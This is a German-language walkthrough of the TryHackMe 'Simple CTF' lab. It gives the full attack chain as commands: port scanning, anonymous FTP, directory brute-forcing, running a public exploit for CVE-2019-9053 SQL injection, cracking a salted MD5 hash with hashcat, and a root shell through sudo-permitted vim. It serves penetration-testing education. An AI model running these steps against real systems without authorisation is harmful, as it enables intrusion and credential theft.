# TryHackMe – Simple CTF Walkthrough

**Platform:** [TryHackMe](https://tryhackme.com/room/easyctf)  
**Difficulty:** Easy  
**Operating System:** Kali Linux (VirtualBox)  
**Topics:** Enumeration, FTP, SQL Injection, Password Cracking, SSH, Privilege Escalation

## 1. Reconnaissance – Nmap

Zunächst werden alle TCP-Ports des Zielsystems gescannt, um offene Dienste zu identifizieren.

```bash
nmap -p- <TARGET_IP>
```

**Parameter:**
- `-p-`: Scannt alle 65.535 TCP-Ports.
- `<TARGET_IP>`: IP-Adresse der TryHackMe-Maschine.

Anschließend werden die erkannten Dienste genauer untersucht:

```bash
nmap -sC -sV -p 21,80,2222 <TARGET_IP>
```

- `-sC`: Führt Standard-Nmap-Skripte aus.
- `-sV`: Erkennt Dienstversionen.
- `-p`: Beschränkt den Scan auf die angegebenen Ports.

**Erkannte Dienste:**

| Port | Dienst | Beschreibung |
|---|---|---|
| 21 | FTP | Dateiübertragung |
| 80 | HTTP | Webserver |
| 2222 | SSH | Remote-Zugriff |

## 2. FTP Enumeration

Da Port 21 geöffnet ist, wird versucht, eine FTP-Verbindung herzustellen.

```bash
ftp <TARGET_IP>
```

Bei dieser Maschine ist ein anonymer Login möglich:

```text
Name: anonymous
Password: [Enter]
```

Verfügbare Dateien anzeigen:

```bash
ls -la
```

Dateien herunterladen:

```bash
mget *
```

**Erklärung:**
- `ls -la`: Zeigt Dateien einschließlich versteckter Einträge an, soweit der Server dies unterstützt.
- `get <datei>`: Lädt eine einzelne Datei herunter.
- `mget *`: Lädt mehrere passende Dateien herunter.

Die heruntergeladenen Dateien werden lokal analysiert:

```bash
cat ForMitch.txt
```

**Erkenntnis:** Die Datei liefert Hinweise auf einen Benutzer und die mögliche Wiederverwendung eines Passworts.

## 3. Web Enumeration – Gobuster

Der HTTP-Dienst auf Port 80 wird auf versteckte Verzeichnisse untersucht.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Parameter:**
- `dir`: Startet die Verzeichnissuche.
- `-u`: Ziel-URL.
- `-w`: Pfad zur Wordlist.

**Ergebnis:**

```text
/simple (Status: 301)
```

Unter folgendem Pfad befindet sich eine CMS-Installation:

```text
http://<TARGET_IP>/simple/
```

Identifiziert wurde **CMS Made Simple 2.2.8**.

## 4. Vulnerability Research – CVE-2019-9053

Nach der Identifizierung des CMS wird nach bekannten Schwachstellen gesucht.

```bash
searchsploit "CMS Made Simple"
```

Gefundene Schwachstelle:

**CVE-2019-9053 – SQL Injection**

Betroffen sind CMS-Made-Simple-Versionen vor 2.2.10.

Bei dieser Schwachstelle handelt es sich um eine *Time-Based Blind SQL Injection*. Dabei können Datenbankinformationen über messbare Antwortverzögerungen ermittelt werden.

Den Exploit lokal kopieren:

```bash
searchsploit -m 46635
```

Dadurch wird das Exploit-Skript `46635.py` in das aktuelle Verzeichnis kopiert.

### Exploit ausführen

Der ursprüngliche Exploit benötigt Python 2 und zusätzliche Bibliotheken wie `requests` und `termcolor`.

```bash
python2 46635.py -u http://<TARGET_IP>/simple/
```

**Parameter:**
- `python2`: Führt das Skript mit Python 2 aus.
- `46635.py`: Exploit-Datei.
- `-u`: URL der verwundbaren Webanwendung.

**Ergebnis:** Durch die SQL Injection werden unter anderem folgende Informationen ausgelesen:

- Benutzername
- Passwort-Hash
- Salt

Der Passwort-Hash liegt nicht im Klartext vor und muss daher separat untersucht werden.

## 5. Password Cracking – Hashcat

Der extrahierte Passwort-Hash und der Salt werden mit Hashcat und einer Wordlist überprüft.

Beispiel aus dem Lab:

```text
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
```

Die Kombination wird in einer Datei gespeichert:

```bash
nano hash.txt
```

Anschließend wird Hashcat gestartet:

```bash
hashcat -a 0 -m 20 hash.txt /usr/share/wordlists/rockyou.txt
```

**Parameter:**

| Parameter | Bedeutung |
|---|---|
| `-a 0` | Dictionary-Angriff |
| `-m 20` | MD5 mit vorangestelltem Salt: `md5($salt.$pass)` |
| `hash.txt` | Datei mit Hash und Salt |
| `rockyou.txt` | Wordlist mit möglichen Passwörtern |

**Wichtig:** Der Hash-Modus muss zum verwendeten Hashverfahren passen. `-O` ist optional und aktiviert optimierte Kernel, die Einschränkungen bei der Passwortlänge haben können.

Das gefundene Passwort anzeigen:

```bash
hashcat -m 20 hash.txt --show
```

### Hashcat in VirtualBox

Falls Hashcat keine OpenCL-Plattform erkennt:

```bash
sudo apt install -y pocl-opencl-icd ocl-icd-libopencl1 clinfo
```

Damit wird eine OpenCL-Laufzeitumgebung für CPU-Berechnungen installiert.

Überprüfung:

```bash
clinfo -l
hashcat -I
```

Hashcat kann anschließend die virtuelle CPU verwenden.

## 6. Initial Access – SSH

Nachdem die Zugangsdaten ermittelt wurden, wird eine SSH-Verbindung zum Zielsystem hergestellt.

Da SSH auf Port 2222 läuft, muss dieser explizit angegeben werden.

```bash
ssh <USERNAME>@<TARGET_IP> -p 2222
```

**Parameter:**
- `<USERNAME>`: Ermittelte Benutzerkennung.
- `-p 2222`: SSH-Port des Zielsystems.

Nach erfolgreicher Anmeldung:

```bash
whoami
id
pwd
ls -la
```

Diese Befehle zeigen den aktuellen Benutzer, dessen Berechtigungen und das Arbeitsverzeichnis.

Die User-Flag kann anschließend gesucht und ausgelesen werden:

```bash
cat ~/user.txt
```

## 7. Privilege Escalation – Sudo Vim

Nach dem SSH-Login besitzt der Benutzer zunächst keine Root-Rechte.

Deshalb werden die verfügbaren `sudo`-Berechtigungen überprüft:

```bash
sudo -l
```

**Ergebnis:**

```text
(root) NOPASSWD: /usr/bin/vim
```

Das bedeutet, dass der aktuelle Benutzer den Texteditor Vim ohne Passwort als Root ausführen darf.

### Ausnutzung der Fehlkonfiguration

Vim unterstützt die Ausführung externer Shell-Befehle.

```bash
sudo vim -c ':!/bin/sh'
```

**Erklärung:**
- `sudo`: Startet Vim mit Root-Rechten.
- `vim`: Texteditor.
- `-c`: Führt beim Start einen Vim-Befehl aus.
- `:!`: Führt einen externen Shell-Befehl aus.
- `/bin/sh`: Startet eine Shell.

Da Vim mit Root-Rechten gestartet wurde, wird auch die Shell mit diesen Rechten ausgeführt.

**Hinweis:** Hierbei handelt es sich nicht um eine Reverse Shell, sondern um eine lokale Privilege Escalation durch eine fehlerhafte `sudo`-Konfiguration.

### Root-Zugriff überprüfen

```bash
whoami
id
```

Erwartetes Ergebnis:

```text
root
uid=0(root)
```

Anschließend kann die Root-Flag gelesen werden:

```bash
cat /root/root.txt
```

## 8. Zusammenfassung

| Phase | Tool | Ziel |
|---|---|---|
| Reconnaissance | Nmap | Offene Ports und Dienste erkennen |
| Enumeration | FTP | Dateien und Hinweise sammeln |
| Web Enumeration | Gobuster | Versteckte Verzeichnisse finden |
| Vulnerability Research | SearchSploit | Bekannte Schwachstellen identifizieren |
| Exploitation | Python 2 / CVE-2019-9053 | Hash und Salt extrahieren |
| Password Cracking | Hashcat | Passwort mithilfe einer Wordlist ermitteln |
| Initial Access | SSH | Zugriff als regulärer Benutzer |
| Privilege Escalation | sudo / Vim | Root-Rechte durch Fehlkonfiguration erhalten |

## 9. Lessons Learned

**Enumeration ist entscheidend:** Durch Nmap, FTP und Gobuster konnten verschiedene Informationen gesammelt werden, die zusammen zur Identifizierung der Schwachstelle führten.

**Veraltete Software stellt ein Sicherheitsrisiko dar:** Die verwundbare CMS-Version ermöglichte den Zugriff auf sensible Datenbankinformationen.

**Passwortwiederverwendung ist gefährlich:** Werden dieselben Zugangsdaten für mehrere Dienste verwendet, kann die Kompromittierung eines Dienstes weitere Zugriffe ermöglichen.

**Sudo-Berechtigungen müssen eingeschränkt werden:** Programme wie Vim können Shell-Befehle ausführen. Werden sie uneingeschränkt als Root freigegeben, kann dies zu einer vollständigen Rechteausweitung führen.

## 10. Weiterführende Ressourcen

- [TryHackMe – Simple CTF](https://tryhackme.com/room/easyctf)
- [Nmap Documentation](https://nmap.org/book/man.html)
- [Gobuster – GitHub](https://github.com/OJ/gobuster)
- [Exploit-DB](https://www.exploit-db.com/exploits/46635)
- [Hashcat Wiki](https://hashcat.net/wiki/)
- [GTFOBins – Vim](https://gtfobins.github.io/gtfobins/vim/)

---

**Disclaimer:** Diese Dokumentation dient ausschließlich Lernzwecken im Rahmen einer autorisierten TryHackMe-CTF-Umgebung. Die beschriebenen Techniken dürfen nur auf Systemen angewendet werden, für die eine ausdrückliche Berechtigung vorliegt.

